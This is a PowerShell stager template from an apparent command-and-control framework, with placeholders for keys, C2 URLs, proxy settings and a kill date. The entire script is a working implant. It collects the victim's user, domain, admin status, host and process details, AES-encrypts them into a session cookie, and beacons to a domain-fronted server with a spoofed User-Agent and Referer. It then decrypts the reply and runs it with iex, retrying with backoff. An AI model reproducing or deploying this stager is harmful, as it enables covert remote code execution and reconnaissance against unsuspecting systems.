#REPLACEINSECURE#
$df=@(#REPLACEDOMAINFRONT#)
$h=""
$sc=""
$urls=@(#REPLACEIMPTYPE#)
$curl="#REPLACECONNECTURL#"
$s=$urls[0]
function CAM ($key,$IV){
try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
$a.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$a.BlockSize = 128
$a.KeySize = 256
if ($IV)
{
if ($IV.getType().Name -eq "String")
{$a.IV = [System.Convert]::FromBase64String($IV)}
else
{$a.IV = $IV}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$a.Key = [System.Convert]::FromBase64String($key)}
else
{$a.Key = $key}
}
$a}
function ENC ($key,$un){
$b = [System.Text.Encoding]::UTF8.GetBytes($un)
$a = CAM $key
$e = $a.CreateEncryptor()
$f = $e.TransformFinalBlock($b, 0, $b.Length)
[byte[]] $p = $a.IV + $f
[System.Convert]::ToBase64String($p)
}
function DEC ($key,$enc){
$b = [System.Convert]::FromBase64String($enc)
$IV = $b[0..15]
$a = CAM $key $IV
$d = $a.CreateDecryptor()
$u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($u).Trim([char]0)))}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "yyyy-MM-dd");
$d = [datetime]::ParseExact($d,"yyyy-MM-dd",$null);
$k = [datetime]::ParseExact("#REPLACEKILLDATE#","yyyy-MM-dd",$null);
if ($k -lt $d) {exit}
$username = "#REPLACEPROXYUSER#"
$password = "#REPLACEPROXYPASS#"
$proxyurl = "#REPLACEPROXYURL#"
$wc = New-Object System.Net.WebClient;
#REPLACEPROXYCOMMAND#
if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
elseif($h){$script:s="https://$($h)#REPLACECONNECT#";$script:sc="https://$($h)"}
$wc.Headers.Add("User-Agent","#REPLACEUSERAGENT#")
$wc.Headers.Add("Referer","#REPLACEREFERER#")
if ($proxyurl) {
$wp = New-Object System.Net.WebProxy($proxyurl,$true);
if ($username -and $password) {
$PSS = ConvertTo-SecureString $password -AsPlainText -Force;
$getcreds = new-object system.management.automation.PSCredential $username,$PSS;
$wp.Credentials = $getcreds;
} else { $wc.UseDefaultCredentials = $true; }
$wc.Proxy = $wp; } else {
$wc.UseDefaultCredentials = $true;
$wc.Proxy.Credentials = $wc.Credentials;
} if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
$wc}
function primern($url,$uri,$df) {
$script:s=$url+$uri
$script:sc=$url
$script:h=$df
$cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$wp = New-Object System.Security.Principal.WindowsPrincipal($cu)
$ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$procname = (Get-Process -id $pid).ProcessName
if ($wp.IsInRole($ag)){$el="*"}else{$el=""}
try{$u=($cu).name+$el} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
$o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;$procname;#REPLACEURLID#"
try {$pp=enc -key #REPLACEKEY# -un $o} catch {$pp="ERROR"}
$primern = (Get-Webclient -Cookie $pp).downloadstring($script:s)
$p = dec -key #REPLACEKEY# -enc $primern
if ($p -like "*key*") {$p| iex}
}
function primers {
if(![string]::IsNullOrEmpty("#REPLACEMEDOMAIN#") -and ![Environment]::UserDomainName.Contains("#REPLACEMEDOMAIN#"))
{
    return;
}
foreach($url in $urls){
$index = [array]::IndexOf($urls, $url)
try {primern $url $curl $df[$index]} catch {write-output $error[0]}}}
$limit=#REPLACESTAGERRETRIESLIMIT#
if($#REPLACESTAGERRETRIES#){
    $wait = #REPLACESTAGERRETRIESWAIT#
    while($true -and $limit -gt 0){
        $limit = $limit -1;
        primers
        Start-Sleep $wait
        $wait = $wait * 2;
    }
}
else
{
    primers
}
